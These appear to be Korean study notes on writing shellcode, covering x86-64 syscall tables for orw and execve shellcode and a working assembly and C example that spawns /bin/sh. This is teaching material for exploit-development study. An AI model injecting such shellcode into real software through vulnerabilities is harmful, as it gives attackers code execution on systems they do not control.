# Shellcode
- **Shellcode** : 취약점을 통해 주입, 실행되는 짧은 기계어 코드 
  - 목적 : 쉘 획득
  - 어셈블리어로 작성하므로 공격 대상의 아키텍처와 운영체제에 따라 다르게 작성됨

### orw(open-read-write) 쉘코드
- orw 쉘코드 : 파일을 열고, 읽은 뒤 화면에 출력해주는 쉘코드
- syscall
  | syscall | rax  | arg0 (rdi)              | arg1 (rsi)        | arg2 (rdx)        |
  |--------|------|-------------------------|-------------------|-------------------|
  | read   | 0x00 | unsigned int fd         | char *buf         | size_t count     |
  | write  | 0x01 | unsigned int fd         | const char *buf   | size_t count     |
  | open   | 0x02 | const char *filename    | int flags         | umode_t mode     |

### execve 쉘코드
- execve 쉘코드 : 임의의 프로그램을 실행하는 쉘코드
- execve syscall
  | syscall | rax | arg0 (rdi)              | arg1 (rsi)                    | arg2 (rdx)                      |
  |--------|-----|-------------------------|-------------------------------|---------------------------------|
  | execve | 0x3b | const char *filename    | const char *const *argv       | const char *const *envp         |
- 목표 : `execve("/bin/sh", null, null)` 실행
- `execve("/bin/sh", null, null)` 어셈블리
  ```asm
  # Name : execve.S
  
  mov $0x68732f6e69622f, %rax   # "/bin/sh" 아스키코드 값 (리틀 엔디안)
  push %rax   
  mov %rsp, %rdi   # rdi = "/bin/sh\x00" (\x00 = 널 바이트) 
  xor %rsi, %rsi   # rsi = NULL
  xor %rdx, %rdx   # rdx = NULL
  mov $0x3b, %rax   # rax = sys_execve   
  syscall   # execve("/bin/sh", null, null)
  ```
- excve 쉘코드
  ```c
  // File name: execve.c
  // Compile Option: gcc -o execve execve.c 

  __asm__(
      ".global run_sh\n"
      "run_sh:\n"
  
      "mov $0x68732f6e69622f, %rax\n"
      "push %rax\n"
      "mov %rsp, %rdi  # rdi = '/bin/sh'\n"
      "xor %rsi, %rsi  # rsi = NULL\n"
      "xor %rdx, %rdx  # rdx = NULL\n"
      "mov $0x3b, %rax # rax = sys_execve\n"
      "syscall       # execve('/bin/sh', null, null)\n"

      "xor %rdi, %rdi   # rdi = 0\n"
      "mov $0x3c, %rax 	# rax = sys_exit\n"
      "syscall        # exit(0)");

  void run_sh();

  int main() { run_sh(); }
  ```
  - 이 코드를 컴파일하고 실행하면 프롬프트가 `sh$`로 바뀜 (쉘 획득 성공) 
